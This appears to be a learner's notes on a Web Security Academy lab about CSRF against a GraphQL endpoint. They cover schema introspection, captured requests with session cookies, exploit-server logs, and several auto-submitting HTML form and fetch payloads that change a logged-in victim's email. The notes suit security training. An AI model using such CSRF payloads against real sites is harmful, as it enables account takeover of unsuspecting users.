
# **WSA-GraphQL-Lab5**  

???

---

[...back](../note-1.md)

*key investigation*
```
> `POST /graphql/v1` endpoint
> #q1 
> > ChangeEmailInput, ChangeEmailResponse{email}, mutation{login, changeEmail}, query{getBlogPost, getAllBlogPosts}
> POST with data {"query":"mutation{changeEmail(input:{email:\"wiener@normal-user.net\"}){email}}"}
> > success payload when log-in as wiener:peter #q3-1
> > GET not allowed #q3-2
> > minimal http-request #q3-3
> experiments with payload in the exploit server
> > must be x-www-form-urlencoded compatible #q7
```

*keys*
```
> graphql endpoint accepts POST, not GET
> mutation changeEmail is authz for logged in user... victim considered logged in
> user exploit server to craft a message with a malicious clickbait... executing changeEmail by victim themselves
> payload must be x-www-form-urlencoded compatible
```

---

### q1 reveal schema

```
{"query": "query { __schema { types { name fields { name description } } } }"}

---

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7000

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "image",
              "description": null
            },
            {
              "name": "title",
              "description": null
            },
            {
              "name": "author",
              "description": null
            },
            {
              "name": "date",
              "description": null
            },
            {
              "name": "summary",
              "description": null
            },
            {
              "name": "paragraphs",
              "description": null
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "ChangeEmailInput",
          "fields": null
        },
        {
          "name": "ChangeEmailResponse",
          "fields": [
            {
              "name": "email",
              "description": null
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "LoginInput",
          "fields": null
        },
        {
          "name": "LoginResponse",
          "fields": [
            {
              "name": "token",
              "description": null
            },
            {
              "name": "success",
              "description": null
            }
          ]
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports."
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isRepeatable",
              "description": null
            },
            {
              "name": "locations",
              "description": null
            },
            {
              "name": "args",
              "description": null
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "args",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "defaultValue",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "description": null
            },
            {
              "name": "types",
              "description": "A list of all types supported by this server."
            },
            {
              "name": "queryType",
              "description": "The type that query operations will be rooted at."
            },
            {
              "name": "mutationType",
              "description": "If this server supports mutation, the type that mutation operations will be rooted at."
            },
            {
              "name": "directives",
              "description": "'A list of all directives supported by this server."
            },
            {
              "name": "subscriptionType",
              "description": "'If this server support subscription, the type that subscription operations will be rooted at."
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "description": null
            },
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "fields",
              "description": null
            },
            {
              "name": "interfaces",
              "description": null
            },
            {
              "name": "possibleTypes",
              "description": null
            },
            {
              "name": "enumValues",
              "description": null
            },
            {
              "name": "inputFields",
              "description": null
            },
            {
              "name": "ofType",
              "description": null
            },
            {
              "name": "specifiedByURL",
              "description": null
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "mutation",
          "fields": [
            {
              "name": "login",
              "description": null
            },
            {
              "name": "changeEmail",
              "description": null
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "description": null
            },
            {
              "name": "getAllBlogPosts",
              "description": null
            }
          ]
        }
      ]
    }
  }
}
```

---

### q2 test changeEmail

```
#for
mutation{changeEmail}
  ChangeEmailInput, ChangeEmialResponse{email}

#learn changeEmail structure
{"query": "mutation{changeEmail(author:carlos)}"}

---
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 10
        }
      ],
      "message": "Validation error (SubselectionRequired@[changeEmail]) : Subselection required for type 'ChangeEmailResponse' of field 'changeEmail'"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 22
        }
      ],
      "message": "Validation error (UnknownArgument@[changeEmail]) : Unknown field argument 'author'"
    }
  ]
}
```

---

### q3 require ChangeEmailResponse

```
> require ChangeEmailResponse{email}

#OG
{
  "query": "mutation { changeEmail(input: {email: \"newemail@example.com\"}) { email } }"
}

---

{
  "errors": [
    {
      "path": [
        "changeEmail"
      ],
      "extensions": {
        "message": "You must be logged in to change email"
      },
      "locations": [
        {
          "line": 1,
          "column": 12
        }
      ],
      "message": "Exception while fetching data (/changeEmail) : You must be logged in to change email"
    }
  ],
  "data": {
    "changeEmail": null
  }
}

```

---

### q3-1 chageEmail as wiener

```
> logged in as wiener:peter

#http-request
POST /graphql/v1 HTTP/2
Host: 0aa5002304b1693180c20d8400080041.web-security-academy.net
Cookie: session=cuEzjntK5PrrIov8p1S3D0KfPfFjqvvb
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 97

{
  "query": "mutation { changeEmail(input: {email: \"wiener@normal-user.net\"}) { email } }"
}

---

#response
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 86

{
  "data": {
    "changeEmail": {
      "email": "wiener@normal-user.net"
    }
  }
}
```

---

### q3-2 try GET

```
GET /graphql/v1?query=mutation{changeEmail(input:{email:"testget@user.net"}){email}} HTTP/2
Host: 0aa5002304b1693180c20d8400080041.web-security-academy.net
Cookie: session=cuEzjntK5PrrIov8p1S3D0KfPfFjqvvb

---

method not allowed
```

---

### q3-3 minimal request

```
POST /graphql/v1 HTTP/2
Host: 0a380080042f08d880034e68001100ac.web-security-academy.net
Cookie: session=2HXJOOcRjYWfLlzfBUCjgFoW6K66oN0R
Content-Length: 99
Content-Type: application/json

{
  "query": "mutation { changeEmail(input: {email: \"wiener@normal-user.net\"}) { email } }"
}

```

---

### q4 test exploit server

```
> we got correct query, but requiring authz while being login
> this lab instructs to 'craft some html that uses a csrf attack to change the viewer's email address, then upload it to your exploit server.
> > exploit server. already specify url to the exploit at https://address/exploit
> > we need to specify: header, body of http-response (not request)
> > > it uses http 1.1
> > we have functions to {store, view exploit, deliver to the victim, access log}
> > ... i think this does something like... we craft header+body, deliver to victim, (victim=viewer is likely a bot in this online lab exercise, prolly auto-click any url link seen in communication; let's say viewer clicks the link + while logged in), the link sends changeEmail request.

#starting header
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

#starting body
Hello, world!

#accesslog from this delivery

49.228.227.235  2025-11-02 08:50:22 +0000 "GET /deliver-to-victim HTTP/1.1" 302 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

10.0.4.105      2025-11-02 08:50:23 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

49.228.227.235  2025-11-02 08:50:23 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

49.228.227.235  2025-11-02 08:50:24 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

49.228.227.235  2025-11-02 08:50:27 +0000 "GET /log HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

49.228.227.235  2025-11-02 08:50:27 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
```

---

### q5 form-encoded payload

```
so i think we need html body that can make a click bait to the victim bot

assume the bot is logged-in and authz for POST to mutation changeEmail endpoint like this wiener normal-user

we may also need to assume that the bot is in its own domain and session... therefore its own host url and session cookie

---

49.228.227.235  2025-11-02 13:18:37 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:18:37 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:54 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:55 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:57 +0000 "POST / HTTP/1.1" 302 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:57 +0000 "GET /deliver-to-victim HTTP/1.1" 302 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
10.0.4.8        2025-11-02 13:32:57 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:57 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:58 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:58 +0000 "POST / HTTP/1.1" 302 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:58 +0000 "GET /log HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
49.228.227.235  2025-11-02 13:32:59 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

---

from log, the malicious link is the /address/exploit
victim will click this once and the link is then gone

---

so this malicious link should lead the victim to send POST mutation changeEmail request

this is the minimal required http-request header (i tested this) and body (keep the email as is since we can access wiener account, though cannot access the associated email wiener@normal-user.net
 
POST /graphql/v1 HTTP/2
Host: 0a380080042f08d880034e68001100ac.web-security-academy.net
Cookie: session=2HXJOOcRjYWfLlzfBUCjgFoW6K66oN0R
Content-Length: 99
Content-Type: application/json

{
  "query": "mutation { changeEmail(input: {email: \"wiener@normal-user.net\"}) { email } }"
}

---

just make minimal solution
```

```
#solution
<form action="https://0a380080042f08d880034e68001100ac.web-security-academy.net/graphql/v1" method="POST"><input type="hidden" name='{"query":"mutation{changeEmail(input:{email:\"wiener@normal-user.net\"}){email}}"}' value=""></form><script>document.forms[0].submit();</script>

#response
query not present

#meaning
graphql doesn't accept form-encoded
```

---

### q6 json payload

```
#form
<form id="f" action="https://0a380080042f08d880034e68001100ac.web-security-academy.net/graphql/v1" method="POST" enctype="text/plain">
<input type="hidden" name='{"query":"mutation{changeEmail(input:{email:\"wiener@normal-user.net\"}){email}}","variables":null}' value="">
</form>
<script>document.getElementById('f').submit();</script>

#use-fetch
<script>
fetch('https://0a380080042f08d880034e68001100ac.web-security-academy.net/graphql/v1', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    query: "mutation { changeEmail(input: {email: \"wiener@normal-user.net\"}) { email } }"
  })
});
</script>

#response (both)
blank...
```

---

### q7 x-www-form-urlencoded

```
> The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

#payload
<form action="https://0a380080042f08d880034e68001100ac.web-security-academy.net/graphql/v1" method="POST">
  <input type="hidden" name="query" value='mutation { changeEmail(input: {email: "pwned@evil.com"}) { email } }'>
</form>
<script>document.forms[0].submit();</script>
```

---

[...back](../note-1.md)
